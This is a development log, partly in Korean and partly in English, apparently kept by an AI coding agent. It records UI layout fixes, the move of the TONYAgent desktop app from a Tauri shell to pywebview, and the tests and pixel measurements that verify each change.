밴드 안인지 — 토큰의 오타는 모든 규칙이 충실히 따라가기 때문에), 모든 규칙이
토큰을 쓰는지, `.transcript`가 `both-edges`인지.

### 2. 설정 패널

- **필드가 세 가지 인셋을 쓰고 있었습니다**: Permission/Thinking 트리거 13px,
  provider 셀렉트 8px, 입력 9px. 같은 패널, 같은 열에서 라벨과 값과 플레이스홀더가
  세 픽셀선에 서 있었습니다 → 패널 전체 12px(`.chip`/`.mode`가 쓰는 값).
- **두 드롭다운의 모양이 달랐습니다**: 트리거는 알약(999px)인데 바로 아래
  provider 셀렉트는 12px 사각형 + 네이티브 화살표. `layout.test.ts`가 원래
  "the trigger is a field, like the settings rows beside it"라고 적어 둔 그대로
  트리거를 12px 라운드 필드로 되돌리고, 셀렉트에는 `appearance: none` + 우리
  `▾`(`span.settings-select-wrap::after`)를 붙였습니다. 이제 두 드롭다운이 같은
  글리프를 같은 인셋(12px)에 그립니다.
- 트리거에 붙어 있던 낡은 주석("...without adding a caret it does not have")도
  고쳤습니다 — 그 캐럿은 이미 렌더링되고 있었습니다.
- **provider 행의 두 필드 폭이 달랐습니다**: 둘 다 `flex: 1 1 0%`, `min-width: 0`
  인데도 셀렉트 172.8px 대 모델 입력 198.8px(452px 패널). `width: 0`이나
  `min-width: 0`을 더 줘도 바뀌지 않아, 엔진의 폼 컨트롤 사이징을 쫓는 대신 그
  행만 `display: grid; grid-template-columns: 1fr 1fr auto`로 바꿨습니다.
  실측 **185.8 / 185.8**. 규칙으로 고정해 두어 다음 정리 패스가 "주변과 같은
  flex로 통일"하며 조용히 되돌리지 못하게 했습니다.

### 3. 앱 전체에서 나온 나머지 두 가지

- **`.sep`(상태바 구분자)**: `<span class="sep" />`에 `color`만 있고 박스가 없어
  아무것도 그리지 않았습니다. 유일한 효과는 좌우 flex gap을 8px에서 16px로 벌리는
  것 — 클래스 이름은 구분자, 선언은 테두리 색, 화면에는 아무것도 없음. → 1px ×
  12px `--border` 괘선. 이제 `connected | openrouter / stealth/space-bunny-alpha |
  sandbox: stopped`로 읽힙니다.
- **Logs 바**: `margin: 0 28px`로 폭 1054px — 창의 어느 선과도 정렬되지 않았습니다
  (읽기 칼럼은 680px). → 컴포저와 같은 칼럼(`padding: 0 28px` + 자식에
  `max-width: var(--measure); margin: auto`), 글자는 같은 19px 인셋.
- `.banner`도 자기 테두리 1px + 18px로 같은 글자선에 맞췄습니다.

### 4. 이 패스의 체크 결과

    npm test                exit 0   492 passed / 0 failed, 78 suites  (489 -> 492)
    npx tsc --noEmit        exit 0
    npm.cmd run tauri:build exit 0   MSI + NSIS
    pytest tests/unit -q    exit 0   623 passed / 8 skipped  (test_build_scripts.py 제외)

패키징 빌드를 다시 띄워(CDP 포트 9333) 실측한 것: 칼럼 인셋, provider 행
185.8/185.8, 셀렉트 캐럿(`::after` content `▾`, right 12px), 그리고 오버플로·정렬
스캐너 전부 clean.

### 아직 하지 않은 것 / 한계

- **JS 전체 스위트에서 한 번 `ComposerPaste`의 "the file limit is the same one the
  picker obeys"가 실패**했고, 같은 명령을 다시 돌리면 통과합니다(그 스위트만
  5회 연속 통과). 파일 리더 콜백이 병렬 부하에서 흔들리는 기존 플레이크로 보이며,
  이 패스는 `attachments.ts`/`Composer.tsx`를 건드리지 않았습니다.
- **좁은 창(≤760px)은 실제로 재보지 못했습니다.** `Emulation.setDeviceMetricsOverride`
  가 이 WebView2에서는 스크린샷에도 측정에도 반영되지 않았고, Tauri 창 크기를
  CDP로 바꿀 방법이 없습니다. 코드상으로는 폭 700px 근처에서 컴포저 행이 넘칠 수
  있습니다(수정 전에도 같은 한계였고 이번 패스로 나빠지지 않았습니다).
- **트랜스크립트에 툴 결과 JSON이 본문 폰트로 보이는 것**은 모델이 툴 결과를 그대로
  에코한 출력이라(이 대화의 `stealth/space-bunny-alpha`가 그렇게 합니다) 레이아웃
  문제가 아니라고 판단해 건드리지 않았습니다. 툴 *호출* 행(`.tool`)은
  `thinking.css`에 스타일이 있습니다.
- 커밋하지 않았습니다.
## 설정 패널: 필드 두 개가 붙어 있던 것 (2026-10-05)

"Settings에서 Provider URL 입력창이랑 그 위에 드롭다운 메뉴랑 너무 딱 붙어있습니다."
스크린샷과 함께 들어온 지적이었습니다. 앞 패스가 provider 행의 **가로**(두 필드 폭,
인셋, 모양)를 손본 그 자리에서 **세로**가 남아 있었습니다.

### 무엇이 문제였나

`.settings-row`에 세로 리듬이 아예 없었습니다. 선언은 `display: flex;
align-items: center; gap: 8px` — 이 8px은 **한 행 안에서** 라벨과 컨트롤 사이의
거리입니다. 그전까지 이 클래스 두 개가 세로로 포개진 적이 한 번도 없었기 때문에
필요하지 않았고, 그래서 필요하다는 사실이 드러나지 않았습니다.

Model 그룹은 이제 두 행이 이어집니다 — provider 드롭다운 + 모델 입력 + Apply,
그다음 줄에 Base URL 입력. 실측(패키징 빌드, CDP): 두 행 모두 452px·30px이고
**세로 간격 0px**. 테두리가 1px 떨어져 있을 뿐이라, 폭으로는 452px인
"필드 하나에 가로선 하나가 긋힌 것"으로 읽힙니다. 마크업은 순진한 형제 div 두 개
뿐이라 코드를 읽어도 드러나지 않습니다.

### 무엇을 고쳤나

`settings.css`에 한 규칙:

    .settings-row ~ .settings-row { margin-top: 10px; }

- **10은 고른 게 아니라 빌려 온 값입니다.** `.settings-note`의 `margin-bottom`이
  이미 10px이고, 그 10이 이 패널이 이미 쓰던 "설명문 → 그 문장이 소개하는 필드"
  간격입니다. 이제 필드 아래의 필드가 첫 필드와 노트 사이의 거리만큼 떨어집니다.
  행 안쪽의 8px보다도 넓어서, 그래야 두 컨트롤이 하나가 아니라 둘로 읽힙니다.
- **`+`가 아니라 `~`**입니다. `+`는 지금은 맞지만 두 행 사이에 뭔가 하나 끼면
  조용히 0이 됩니다. 일반 형제는 그걸 버티고, 이 패널에서 포개진 행이 두 개뿐이라
  비용도 없습니다.
- JSX는 주석 한 단락만 늘렸습니다. Base URL이 왜 *별도 행*인지(위 행은
  `1fr 1fr auto`이라 세 번째 필드는 Apply 버튼의 64px 트랙에 들어가게 됩니다).

### 실측 (패키징 빌드 재시작, CDP)

    provider 행   t=616.47  b=646.47   452px
    Base URL 행   t=656.47  b=686.47   452px
    두 행 사이                  10.00px    (수정 전 0)
    note → provider 행          10.00px    <- 10이 같다는 것이 규칙의 근거
    Base URL 행 → 힌트           7.00px    (그대로)
    행 안쪽 gap                  8.00px

두 가지 독립적인 방법으로 확인했습니다. `getBoundingClientRect`로 잰 위 값과,
스크린샷의 픽셀을 세어 `--input`(#2b2b2b) 두 밴드 사이에 `--surface`(#202020)
**20 device px = 10 CSS px**가 놓인 것. 그리고 `margin-top: 0px`를 런타임에 강제로
끼워 넣으면 간격이 정확히 0으로 돌아오며, 뺐더니 10이 되돌아옵니다 — 10이 새
규칙에서 온다는 뜻입니다.

다른 행은 안 건드렸습니다(그룹별 `margin-top` 실측): Permission/Thinking은
`.settings-row`가 아예 없고(`.permchoice`), Project folder 행은 `0px`,
`.settings-key` 안의 키 입력도 `0px` — 그쪽은 `.settings-key` 자신의
`margin-top: 12px` + `padding-top: 10px` + 테두리가 일을 합니다.

### 테스트

`layout.test.ts`의 "two fields stacked are two fields, not one with a line across
it". 숫자가 아니라 **관계**로 고정했습니다 — 나중에 10을 바꾸고 싶을 수 있으니까:

1. 간격이 0보다 크다.
2. 간격 >= 행 안쪽 `gap` — 이게 깨지면 두 필드가 하나의 격자로 읽힙니다.
3. 간격 == `.settings-note`의 `margin-bottom` — 위의 근거 그 자체.
4. `~`이고 `+` 규칙이 존재하지 않는다.

변이 검사로 확인했습니다. 규칙을 지우면 1번에서, `~`를 `+`로 바꾸면 4번에서
실패합니다. (돌려놓고 바이트까지 확인했습니다.)

이번에 실제로 걸린 실수 하나: 처음 쓴 테스트가 `.settings-note`의 `margin-bottom`
을 정규식으로 찾았는데, 그 규칙은 `margin: 0 0 10px` **약식**을 씁니다. 조용히
0을 읽어냈고 테스트가 "10 !== 0"으로 실패했습니다. 약식/정식 둘 다 읽는
`marginBottom()` 헬퍼를 넣었습니다 — 아무것도 측정하지 않는 테스트는 테스트가
없는 것보다 나쁩니다.

### 체크 결과

    npm test                exit 0   493 passed / 0 failed, 78 suites  (492 -> 493)
    npx tsc --noEmit        exit 0
    npm.cmd run tauri:build exit 0   MSI + NSIS
    pytest tests/unit -q    exit 0   623 passed / 8 skipped  (test_build_scripts.py 제외)

### 하지 못한 것

- **스크린샷을 눈으로 확인하지 못했습니다.** 이 빌드에서 `read_files`가 이미지를
  BLOCKED하고, preview 브라우저가 프레임을 만들지 않아(컴포지팅 실패)
  `preview_screenshot`이 비었습니다. 그래서 위의 "픽셀을 세는" 확인으로 대신했습니다
  — 눈으로 보는 것보다 약하지는 않고, 오히려 정량입니다. 화면을 직접 열어보시면
  10px 간격이 보입니다.
- 좁은 창(<=760px)은 이전과 동일하게 `Emulation`이 먹지 않아 실측하지 못했습니다.
- 커밋하지 않았습니다.
## 설정 모달의 스크롤바가 모서리 밖으로 나가던 것 (2026-10-05)

"설정 모달에 스크롤바가 Overflow되는 느낌이 있네요"는 지적. 앞 패스가 세로 리듬을
손본 그 자리에서, 이번엔 스크롤바 자체가 문제였습니다.

### 무엇이 실제로 잘못돼 있었나

`.modal`은 24px 라운드 박스인데 스크롤되는 컨테이너이고, 스크롤바는 모서리가
직각인 상자입니다. Chromium은 스크롤바를 border box 위에 칠하면서 그라운드
라운디우스로 자르지 않습니다. 그래서 **thumb가 이동을 끝내는 양 끝에서 마지막 몇
픽셀이 패널이 아니라 스크림 위에 그려집니다.**

실측(패키징 빌드, 1200x800). thumb는 x `841.75..845.75`의 4px 폭:

    scrollTop = 0        thumb y  28.50 .. 641.00
    -> 패널 실루엣 밖 7.0px (y 28.5..35.5), 최대 7.52px
    scrollTop = max      thumb y 158.75 .. 771.00
    -> 패널 실루엣 밖 7.0px (y 764.0..771.0), 최대 6.98px

완전히 대칭입니다. 화면에서는 모달의 모서리가 이미 휘어진 뒤에도 그 선이 더
이어졌다가 중간에 끊겨 보입니다.

**핀 코드를 정확히 짚는 법이 두 번 필요했습니다.** 첫 판정(회색 창으로 thumb를
찾음)은 패널 모서리의 1픽셀 안티알리어싱 — 표면과 테두리 사이의 회색 보간 — 을
thumb로 오인해서 "thumb가 743px"고 잘못 보고했습니다. thumb는 4px 폭이므로
**3 CSS px 이상의 연속 구간만 thumb로 세는** 것으로 바꿔서야 맞았습니다. 두
번째는 모서리 밖으로 나간 **행 수**로 바꾸는 것. 어느 쪽이든 눈으로 볼 수 없는
숫자를 측정하는 이상한 수정이 두 번 필요했습니다.

### 무엇을 고쳤나

`scrollbars.css`에 한 규칙, `.modal`에만:

    .modal::-webkit-scrollbar-button:vertical:decrement,
    .modal::-webkit-scrollbar-button:vertical:increment {
      display: block;
      height: 14px;
      background: transparent;
      border: none;
    }

thumb가 아니라 **이동 궤적을** 안쪽으로 당깁니다. 그러면 thumb의 분모도 같이
줄어들기 때문에 thumb가 보이는 비율을 거짓말하지 않습니다. `.modal`에 한정한
이유: 트랜스크립트는 모서리가 없는 풀블리드 스크롤러라서 비용만 보고 이득이
없습니다.

### 대가 — 추천할 때한 것보다 훨씬 컸습니다

사용자에게 이 방식을 권하면서 "thumb 비율 오차 1% 미만"이라고 **추측**으로
말씀드렸습니다. 실측은 **7.2%**입니다.

    수정 전  thumb 612.2px / 750px = 81.6%   (실제 가시 82.7%)   오차 1.1%
    수정 후  thumb 566.2px / 750px = 75.5%   (실제 가시 82.7%)   오차 7.2%

구조적인 이유가 있습니다. 모서리가 가져가는 칠은 트랙이 여전히 계산하는 칭이라,
thumb를 모서리 안에 넣는 **모든** 방법은 칠해진 길이를 트랙에 대해 줄입니다.
오차를 0으로 만드는 유일한 방법은 모서리 자체를 줄이는 것(`.modal`의 라운드를
`--radius-lg` 24px에서 `--radius-sm` 12px로)인데, 사용자가 선택한 것은 이 방법이
아니었습니다. 12px면 실측 기준 thumb 최하단 열이 0.79px만 밖으로 나가 사실상
사라집니다 — **하지만 빌드해서 측정은 하지 않았습니다.** 선택이 이쪽으로 갈
가능성을 남겨둔 상태입니다.

부수 효과로 스크롤을 끝까지 내리면 **thumb가 트랙 끝에서 32px 전에 멈춥니다.**
7px 넘침이 "스크롤바가 끝에 못 미닿는" 다른 어색함으로 바뀐 셈이고, 이건
같은 부류의 지적이 될 수 있습니다.

### 무효임을 증명한 것 (틀린 이야기를 남기지 않으려고)

- **풋터 상단 헤어라인이 10px 짧게 끊기는 것**은 별개입니다(x=839에서 멈춤).
  음수 마진을 더 넓혀 봤는데 **배치 상자만 바뀌고 픽셀 하나도 안 바뀌는** 것을
  주입 실험(풋터 배경을 빨강으로 칠해보는 것)으로 확인했습니다. 스크롤
  컨테이너는 자식을 스크롤포트 — 스크롤바를 뺀 영역 — 로 잘라내기 때문입니다.
  되돌렸습니다. 그릇된 픽셀도 없는 선언을 남기는 것보다 없는 편이 낫습니다.
  같은 이유로 `--scrollbar-size` 토큰, `.modal`의 `scrollbar-gutter: stable`,
  `overflow-x: hidden`도 전부 되돌렸습니다. `scrollbar-gutter: stable`은 높이
  10px를 먹어서(clientHeight 750 -> 740) 풋터가 765로 올라가는 **새로운 결함**을
  만들었고, `overflow-x: hidden`으로 되돌릴 수 있었지만 필요한 근거가 없어졌으므로
  전부 걷어냈습니다.
- **CDP로 주입한 스크롤바 의사 요소 스타일은 먹지 않습니다.** `<style>`을
  head에 넣자마자 `getComputedStyle`은 `borderTopWidth: 40px`를 보고했는데,
  캡처는 기준 이미지와 **픽셀 0개가 달랐습니다**. 스크롤바는 만들어질 때 스타일이
  정해지고 나중 주입으로는 다시 칠해지지 않습니다. 그래서 변형별 비교는
  전부 무효 판정이고, **실제 스타일시트에 넣고 `tauri:build` 해서만** 재고가
  가능합니다. 그 과정에서 후보를 다섯 개나 해봤는데, 그 중 셋(버튼 3종)은
  전부 기준과 픽셀 동일 — 주입이 먹지 않았기 때문입니다.

### 테스트

`layout.test.ts`의 "the dialog's scrollbar stays inside the dialog's corners".
decrement/increment **양쪽** 다 존재할 것, `display: block`, `height`가 px로
있을 것, `background: transparent`일 것(불투명하면 브라우저 화살표가 자리를
차지하는 경로), 그리고 전역 `::-webkit-scrollbar`에는 button 규칙이 없을 것
(트랜스크립트는 비용 없이 정확도만 깎이는 것을 막는다).

변이 검사 2건 — 버튼 규칙 삭제, 버튼을 `var(--raised)`로 바꾸어 불투명화 — 둘 다
실패 확인 후 되돌렸습니다.

### 체크 결과

    npm test                exit 0   494 passed / 0 failed, 79 suites  (493 -> 494)
    npx tsc --noEmit        exit 0
    npm.cmd run tauri:build exit 0   MSI + NSIS
    pytest tests/unit -q    exit 0   623 passed / 8 skipped  (test_build_scripts.py 제외)

### 하지 못한 것

- **눈으로 확인하지 못했습니다.** 이 빌드는 이미지 읽기가 BLOCKED이고 preview
  브라우저가 프레임을 만들지 않습니다. 위 수치는 전부 스크린샷 픽셀 계측이고,
  그 계측기가 두 번 틀렸던 것을 교정하면서 얻은 값입니다.
- **대안(라운드 24px -> 12px)을 빌드해서 측정하지 않았습니다.** 계산상 0.79px만
  밖으로 나가 사실상 사라지지만, 실측 전까지는 추측입니다.
- 커밋하지 않았습니다.

---

## Tauri -> pywebview: the shell is Python now (2026-10-10)

The app was three moving parts: a Vite bundle, a Rust shell that embedded it, and
a frozen Python core the shell spawned as a sidecar. It is one now. The window is
`python -m tonyagent.window`, the core is that process's child, and the bundle is
read off disk.

**What went away:** `app/src-tauri/` (the whole crate), `cargo`, `rc.exe` and the
Windows SDK requirement, `scripts/build_sidecar.py`, `scripts/sidecar.spec`,
`scripts/find_windows_sdk.ps1`, `scripts/verify_system_menu.py`, the three
`@tauri-apps/*` dependencies, `Start TONYAgent (Tauri).bat`, and two of the three
build stages. The build is `vite build` and nothing else.

**What did not change:** the JSONL protocol, `headless/server.py`, every
component, `events.ts`, `markdown.ts`, all 21 stylesheets, and all of
`backend.ts` above the transport -- framing, request ids, reply routing,
`carriesSecret`. `LineTransport` was already the seam, so the shell swap landed
underneath it.

### The new shell, file by file

| File | Job |
|---|---|
| `src/tonyagent/window/host.py` | `main()`: serve the bundle, start the core, open the window |
| `src/tonyagent/window/core.py` | The core as a child process: stdout reader, stderr reader, and a pump that batches frames |
| `src/tonyagent/window/assets.py` | `app/dist/` on 127.0.0.1, ephemeral port, `.woff2` mapped by hand |
| `src/tonyagent/window/bridge.py` | `window.pywebview.api`: the page's whole view of the host |
| `src/tonyagent/window/win32.py` | Rounded corners, the system menu, `IsZoomed` |
| `app/src/bridge.ts` | The other side of the seam: `host()`, `whenHostReady`, `installPushHandlers` |

### Three things that fail silently, all found by running it

1. **`evaluate_js` before the document is ready does not fail -- it deadlocks.**
   The script reaches the webview, the result callback never fires, and the
   semaphore `evaluate_js` waits on is never released. The pump runs on its own
   thread, so the symptom is a window that renders and then never speaks again,
   with no error anywhere. `Bridge.ready()` is the gate; frames buffer until the
   page calls it.
2. **pywebview builds the page's API by walking `dir(js_api)`, *evaluating* every
   public attribute and recursing into non-callables.** A public `maximized`
   property was evaluated by that walk, off the GUI thread; reading the maximized
   state touches the WinForms control's handle, and that deadlocked the window
   before it loaded. A public `self.window` would also have handed the page
   pywebview's entire Window API. `Bridge`'s state is now strictly private
   (`_attach`, `_frames`, `_maximized`, `_hwnd`) and its public methods are
   exactly the page's API.
3. **Tauri's `"deep"` drag region and pywebview's are not the same thing.**
   pywebview walks *up* from the press looking for the class, so by default a
   press anywhere inside the title bar drags -- including on the caption buttons
   and the model picker. The host sets `DRAG_REGION_DIRECT_TARGET_ONLY = True`,
   narrowing it to "the pressed element carries the class itself", so the class
   lives on the bar and its background regions and the controls stay clickable.
   `TopBar.test.tsx` pins that exact set of four elements.

### Verified, not assumed

`scripts/verify_window.py` drives the real objects and probes the page from the
host side. The check that matters most is that the *app's own* transport sent
`state`, `tools.get` and `reasoning.list` to the real core -- `tools.get` is only
sent after `state` returns, so a reply demonstrably came back through the bridge.
The window then reads "connected ... sandbox: stopped".

The CSP moved from `tauri.conf.json` into a `<meta>` in `index.html`, and the one
thing that could not be reasoned out was whether it would block pywebview's
injected bridge. It does not: WebView2's host script injection is not subject to
the page's policy. That is a measured fact now, and `webviewPolicy.test.ts`
follows the policy to its new home.

### Still open

- The `Start TONYAgent (Prebuilt).bat` name is kept, but there is one launcher
  now, not two.
- `scripts/probe_webview.py`, `scripts/shot_screen.ps1` and
  `scripts/window_rect.ps1` attach to a WebView2 over CDP, which the Tauri build
  enabled and pywebview may not. They need re-pointing or retiring.
- `README.md` is stale well beyond this change: it still describes the Tkinter
  UI, `core/app.py` and `ui/views/`. Only the claims this change made false were
  corrected.

---

## The mark moved to the window's corner (2026-10-10)

The app's "T" was in the sidebar's head, beside the wordmark. It is in the title
bar's top-left corner now, alone.

**The rail's copy did not leave with it, and that is fixed below.** This section
used to end "and the sidebar's head is the toggle and nothing else", which was the
*intent* rather than the result: `.rail-logo` stayed in the rail, so the window
drew the same glyph twice -- 22px in the corner and 32px in the strip, 64px
apart. See "The rail's mark is gone" at the end of this file.

**Why the sidebar was the wrong place.** That panel is an *overlay*: it comes and
goes with `railExpanded`. A logo that disappears when you close a panel is not the
window's mark -- and the corner above the rail is the one place in the window
that is always on screen.

**What it cost in CSS, and why that is the interesting part.** The bar used to
indent all of its contents past the left column with
`padding: 0 0 0 calc(var(--rail-w) + 8px)`. That padding is gone, and the indent
is the mark's own width now: `.topbar-mark` takes exactly `--rail-w` and the bar's
existing 8px `gap` does the rest. The conversation tab lands on the same pixel it
always did, which is why this is one element and one width rather than a new
computed offset -- and `layout.test.ts` asserts the three parts separately, because
a `padding` that came back alongside the mark would double the indent and read as
"almost aligned" rather than as a bug.

**Measured in the running window**, not inferred from the stylesheet.
`scripts/verify_window.py` now reports the mark's box, and it answers:

    box 0,0 64x51 / glyph 22px at 21

-- the window's own corner, the rail's width, and a 22px glyph centred in it
(`(64 - 22) / 2 = 21`). The same probe reports **5** drag regions rather than 4:
the mark carries `pywebview-drag-region` like the rest of the bar's empty
surface, because with `DRAG_REGION_DIRECT_TARGET_ONLY` a press drags only when it
lands on an element carrying the class itself -- and 64x51 of dead title bar
would be the one patch of the window that cannot be dragged by.

The wordmark went with the mark. The tab beside it already reads "TONYAgent"
whenever no conversation is open, so the corner is the glyph alone.

---

## The window's corners, and the settings gear (2026-10-10)

Two things the app had claimed and did not do, plus a flake that turned out to be
in a test rather than in what it tests.

### The corners were not round, and the code that rounded them ran

`win32.round_corners` sets `DWMWA_WINDOW_CORNER_PREFERENCE` to `DWMWCP_ROUND`,
and had done since the Rust shell. It returned without raising, every time, and
the corners were square.

Two causes, both found by measuring rather than by reading:

1. **`shadow=False`.** pywebview's `shadow` is what calls
   `DwmExtendFrameIntoClientArea`, and with no DWM frame there is nothing for DWM
   to round. Measured: with it off the window's style is `WS_CAPTION` off,
   `WS_THICKFRAME` off, `WS_POPUP` off -- no frame at all -- and
   `DwmGetWindowAttribute` reads the preference back as **0** (default), which is
   the set having been accepted and discarded. The comment that argued for `False`
   had it exactly backwards: the frame is what a shadow is cast from, not the
   other way round.
2. **It was applied too early.** `_startup` runs from `webview.start(func)`, which
   is before the form is on screen, and setting the attribute then is discarded
   the same way. Applying it on `window.events.shown` is what survives, so
   `_startup` now does both -- and `tests/unit/test_window_host.py` pins the
   subscription, because "it is applied" is exactly the half that was already
   true.

Verified with pixels rather than with the read-back alone:
`scripts/verify_corners.py` attaches to the *running* app by window title, grabs
the screen, and prints the corner as a map. It reads `value=2` and prints a
quarter circle of non-window pixels in the top-left:

```
#.......................
........#...............
..#..........########.##
.........###############
........################
......##################
```

### The gear was an outline, and read as a sun

Both places -- the rail and the sidebar's foot -- drew a byte-identical 8-tooth
Feather outline at 17px with a 1.7 stroke. That is about 1.2px of ink around
teeth about 2px wide, so the teeth merge into the ring they sit on and the whole
thing reads as a brightness control. The rail's own comment records this
happening once already, and the fix then -- one continuous outline around the
teeth -- was real and not enough: a thin ring around a thin hub ring is still two
rings at that size.

It is a **filled** silhouette now, which is what Windows itself uses for this
control, with the hub as a second subpath under `evenodd` so that it is a hole
rather than a circle drawn on top. It lives in `app/src/Gear.tsx`, because the
two copies were identical strings in two files.

That needed one small refactor: the rail wrapped every entry in a shared 17px
`<svg>`, and a solid glyph cannot be nested inside it -- a nested `<svg
width="17">` is sized in the parent's *user units*, so inside `viewBox="0 0 24
24"` it comes out 17/24 of the box. `Icon` became `glyph()`, returning a node,
and each entry carries a complete one.

`IconRail.test.tsx` asserted the old outline (two paths, `stroke="currentColor"`)
and now asserts the three things that make this a gear rather than a sun: one
path, filled rather than stroked, hub cut out of it.

### The flake was a millisecond in the fixture

`test_build_scripts.py` was documented here as "4 of its 24 tests fail on any
given run, a different 4 each time". The cause was `_make_current`: it wrote the
output and the sources and then aged only the sources, so an "edit" written by
`_write` landed a few milliseconds after the output's timestamp -- inside the
range where a filesystem can report the two as *equal*, at which point `-gt` says
the tree is current and the test that expects a rebuild fails.

The output is backdated an hour now. The suite has run clean five times running,
and the earlier note blaming the three-stage tree was wrong: that tree had
nothing to do with it.

---

## The shortcut, and one window instead of two (2026-10-10)

`scripts/make_shortcut.ps1` writes `TONYAgent.lnk` in the repository folder --
pointing at `Start TONYAgent (Prebuilt).bat`, carrying `app/icons/icon.ico` and a
description, so the app can be opened by double-clicking instead of by
remembering a command. `-Destination "$env:USERPROFILE\Desktop"` puts it on the
Desktop instead. The `.lnk` is gitignored: it holds an absolute path to this
checkout, so it is a fact about one machine, and the script is the thing to carry
to another.

The shortcut targets the launcher rather than `pythonw -m tonyagent.window`,
because the launcher is what rebuilds the frontend when it is behind and checks
that `pywebview` is installed before it starts anything. A shortcut straight to
the interpreter would be a second entry point that skipped both.

### Making it meant looking at what it would open

And what it would open was two windows. `start "" python -m tonyagent.window`
gave the app its own console: `python` is a console-subsystem program, so `start`
allocates a *new console* for it. Measured by enumerating the app's top-level
windows, which found a visible `PseudoConsoleWindow` beside the form:

    1 console window(s): the app does have one beside its window.

`pythonw` is the same interpreter with no console. The launcher starts that now,
and the same probe reports `0 console window(s)` with the form still there and
still titled `TONYAgent`.

### Which cost the host its stderr, so it keeps a log instead

`pythonw` has no console, and the host's own `logger` lines are where a startup
failure says why -- "a window that never appears with no message anywhere" is the
failure worth avoiding. So `host.has_console()` asks the OS (`GetConsoleWindow`),
and with no console the host moves its log to `window.log` beside `config.toml`.

Two things were measured on the way, and both had been assumed wrong:

1. **`sys.stderr` is not `None` under `pythonw`.** On Python 3.13 it is a
   `TextIOWrapper` whose writes go nowhere -- the repr is two wrappers, not
   `(None, None)`. The obvious check would have concluded there *was* a console
   and left the log on a stream nobody reads.
2. **The Windows Store Python redirects `%APPDATA%`.** Python writes
   `%APPDATA%\TONYAgent\window.log`, `os.path.exists` returns `True`, and a shell
   looking at that path finds nothing: the file is really under
   `AppData\Local\Packages\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\LocalCache\Roaming\TONYAgent\`.
   That is app-container redirection, not a bug here -- but it is why the log is
   not where an outside process would look for it. The app sees one consistent
   directory; only something outside the container sees two.

`host.py` also never imported `sys`, so the first version of this raised a
`NameError` inside the very function meant to make failures visible, and the app
died before the window opened. The existing `python -m tonyagent.window --help`
test in `tests/unit/test_window_host.py` is what caught it.

### The warning that was not a failure

The new log reported one straight away:

    WARNING | tonyagent.window.host:apply - The window has no native handle, so
              it cannot be styled: 'NoneType' object has no attribute 'Handle'

on a launch whose corners `scripts/verify_corners.py` then read as `value=2` with
a quarter-circle in the pixel map. It was the *first*, deliberately early
attempt: `_startup` runs before the form exists, and the `shown` retry is the one
that does the work. The early attempt logs at `debug` now and only the second one
warns, because there a missing handle really is unexpected. The `shown`
subscription is a zero-argument lambda, because pywebview's `Event.set` decides
how to call a handler by counting its parameters -- a handler with a defaulted
parameter would be called through the `*args` branch instead.

### The fixture that stubbed a line that no longer existed

Changing `python` to `pythonw` failed five tests in `test_build_scripts.py`, all
of them the launcher fixture's own guard:

    assert fragment in launcher, f"the launcher no longer contains {fragment!r}"

which is that guard doing exactly what it was written for. `README.md`'s "First
Run" was wrong in the same way and worse: it said `python -m tonyagent`, which is
not a command at all -- `tonyagent` is a package with no `__main__`, so it exits
with "cannot be directly executed". That section now gives the shortcut and
`python -m tonyagent.window`.

---

## The rail's mark is gone (2026-10-10)

The app's glyph was drawn in three places: the taskbar (`icon.svg`), the title
bar's corner (`.topbar-mark`, 22px) and the rail's head (`.rail-logo`, 32px). The
first two are the app's mark. The third was a leftover -- the mark moved to the
corner and this copy did not leave with it -- so the window drew the same drawing
twice, 64px apart, and the rail's one is what read as a second logo rather than as
the app's.

**Gone from three places, and each had to be found rather than remembered.**

- `IconRail.tsx` no longer renders it, and no longer imports `AppMark`. What sits
  where it was is a comment saying the absence is deliberate, because an empty
  spot in a strip of icons is otherwise indistinguishable from an oversight.
- `.rail-logo` is out of `rail.css` -- the whole rule, not just its use. A class
  nothing renders is a class the next person reuses by accident.
- `IconRail.test.tsx` asserted the rail *drew* the mark, positionally against
  `MARK_RECTS`, and that is exactly the test that had to change: it was green the
  whole time the window was drawing two logos. It is a negative assertion now --
  no `.rail-logo`, no `rect` anywhere inside `.rail`, and the strip's first child
  is a `.rail-btn`. A test that checked the rail drew the *right* glyph would pass
  with the glyph in the wrong place, and the wrong place is the whole failure.

The `rect` half is worth its own line: every glyph the rail does draw is a `path`
-- the toggle, search and stop are stroked outlines and the gear is one filled
silhouette -- so a `rect` inside the strip can only be the mark's two strokes,
wherever someone puts them next.

**Measured in the running window**, through `scripts/verify_window.py`, which has
a check for it now:

    the mark's corner: box 0,0 64x51 / glyph 22px at 21
    the rail draws no mark: corner 2 rects, first-run 2, rail 0 rects in 0 .rail-logo box(es)

The corner still draws its two rects, the first-run state still draws its two, and
the rail draws none in no box at all.

### The shortcut moved, and that is fine

`TONYAgent.lnk` was made in the repository folder and then moved to the Desktop. A
shortcut is not a relative path: it holds an absolute target and its own "Start
in", so moving the file changes nothing about what it opens -- the target is the
launcher by absolute path and the working directory is the repository. The
`-Destination` parameter is for putting it where you want it in the first place.

---

## The sidebar's foot (2026-10-10)

Two things in the panel the rail opens into. The first is a measurement rather
than a reading, and the second is a button that did not do what it looked like.

### The settings button was not at the bottom

Because the only element that could push it there is not rendered when the
conversation list is empty -- which is what a fresh window has. `ConversationList`
swaps `.chatlist-rows` for `.chatlist-empty` when there are no conversations, and
only the rows carried `flex: 1`. So nothing above the foot took the free height,
and the foot sat wherever the content happened to end.

**Found by measuring the real window**, and it had to be: the stylesheet reads as
correct. The panel is `top: var(--topbar-h); bottom: 0`, the foot is its last
child, and the rows do declare `flex: 1`. A probe that opened the panel and read
the boxes said

    chats pane : panel 0,52 288x712 | rows MISSING | foot 0,218 287x55 | acts Clear conversation@227 Search project@227 Settings@227

`rows MISSING` is the whole answer -- 218px into a 712px panel. `.chatlist-empty`
declares `flex: 1` now, so exactly one of the two grows in either state: the rows
when there are conversations, the empty box when there are not. After:

    chats pane : panel 0,52 288x712 | rows MISSING | foot 0,709 287x55 | acts Search project@718 Settings@718

709 + 55 = 764, the panel's own bottom edge. `layout.test.ts` asserts both
declarations, and `scripts/verify_window.py` measures the gap, because this is a
fact about a rendered box and no stylesheet test can see it.

### Clear is gone

It was the trash glyph in the foot, beside Search and Settings, and it read as
"delete this chat" -- which is not what it did. It emptied the transcript you were
reading and left the conversation in the list. Deleting a conversation is the row
menu's Delete, which names the row it acts on.

So it is out of the component, out of `Props`, out of `App.tsx` -- with the
`clear` callback it was the only caller of, and the `messageCount` prop that fed
nothing but its disabled state -- and out of the test fixture.
`ConversationList.test.tsx` asserts the foot is exactly
`["Search project", "Settings"]`.

